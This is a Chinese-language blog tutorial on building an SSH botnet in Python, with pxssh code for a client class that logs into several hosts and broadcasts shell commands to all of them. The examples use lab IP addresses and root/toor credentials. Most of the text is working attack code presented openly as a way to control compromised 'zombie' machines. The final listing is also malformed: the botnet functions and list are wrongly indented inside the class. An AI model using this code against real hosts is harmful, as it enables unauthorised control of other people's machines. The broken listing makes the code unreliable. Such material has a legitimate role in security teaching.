# 原创
：  【Python脚本进阶】2.2、组建一个SSH僵尸网络（终）

# 【Python脚本进阶】2.2、组建一个SSH僵尸网络（终）

**目录**

[一、简介](#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B)

[1.1、概述：](#%E6%A6%82%E8%BF%B0%EF%BC%9A)

[二、实现](#%E4%BA%8C%E3%80%81%E5%AE%9E%E7%8E%B0)

[2.1、函数：](#%E5%87%BD%E6%95%B0%EF%BC%9A)

[2.2、连接：](#%C2%A0%E8%BF%9E%E6%8E%A5%EF%BC%9A)

[2.3、组建僵尸网络](#%E7%BB%84%E5%BB%BA%E5%83%B5%E5%B0%B8%E7%BD%91%E7%BB%9C)

---


## 一、简介

> 
<h3>1.1、概述：</h3>
能通过SSH控制主机， 接下来就要同时控制多台主机
攻击者在达成恶意目的时， 通常会使用被黑掉的计算机群。我们称之为僵尸网络， 因为被黑掉的电脑会像僵尸一样执行指令。为构建僵尸网络， 我们必须引入一个新的概念一类。类的概念是面向编程对象和编程模型的基础。在这一编程模型中， 我们会把各个对象和它们所关联的方法一起实例化。在僵尸网络中， 每个单独的僵尸或client（客户端）都需要有能连上某台肉机，并把命令发送给肉机的能力


---


---


## 二、实现

> 
<h3>2.1、函数：</h3>
__init__ ：是初始化initialization的缩写，在使用类创建对象之后被执行，用于给新创建的对象初始化属性用，如初始化属性的语句就是 self.name=name
<hr/>
prompt是 javascript语言中的一个方法，主要用处是显示提示对话框


> 
<h3>2.2、连接：</h3>
实现每个单独的僵尸或client（客户端）都需要有能连上某台肉机，并把命令发送给肉机的能力
<pre><code>import optparse
import pxssh


class Client:
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception as e:
            print(e)
            print('[-] Error Connecting')

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before
</code></pre>



> 
<h3>2.3、组建僵尸网络</h3>
生成Client()类对象的代码。为了构造client 对象， 需要主机名、用户名，以及密码或密钥。同时， 这个类还要包含维持与肉机连接所需的方法 connect() 、send_ command(）和alive(）。当引用属于类中的变量时， 是以self 后接变量名的方式表示它的。
为了构建僵尸网络， 要建立一个名为botNet 的全局数组，其中记录了单个client 对象。编写一个名为addClient()的方法，它的输入是主机名、用户和密码，并以此实例化一个client 对象， 并把它添加到botNet 数组里。接下来的botnetComrnand()函数只要一个参数要发布的命令。这个函数遍历整个数组， 把命令发送到botNet 数组中的每个client 上

<pre><code>import optparse
import pxssh


class Client:
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception as e:
            print(e)
            print('[-] Error Connecting')

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before


    
    def botnetCommand(command):
        for client in botNet:
            output= client.send_command(command)
            print('[*] Output from ' + client.host)
            print('[+] ' + output + '\n')

    def addClient(host, user, password):
        client = Client( host, user, password )
        botNet.append(client)

    botNet = []
    addClient('10.10.10.110', 'root', 'toor')
    addClient('10.10.10.120', 'root', 'toor')
    addClient('10.10.10.130', 'root', 'toor')
    botnetCommand('uname -v')
    botnetCommand('cat /etc/issue')
</code></pre>

